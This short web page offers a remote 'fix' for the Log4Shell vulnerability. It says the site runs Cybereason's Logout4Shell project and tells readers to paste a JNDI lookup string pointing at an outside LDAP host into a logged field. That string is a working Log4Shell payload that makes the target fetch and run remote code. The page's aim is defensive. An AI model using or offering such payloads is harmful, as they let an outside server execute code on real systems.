Patch log4j via RCE

Why?

Log4Shell.

How?

On this server, the project https://github.com/Cybereason/Logout4Shell is deployed and disables the JNDI Lookup by running a RCE with a patch. Just paste the following entry into a "problematic" field/logged user input, and be save until the next restart: 
${jndi:ldap://log4j-fix.de/a}
The change is not persistent and logs Setting FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS value to True, if the patch was successful.
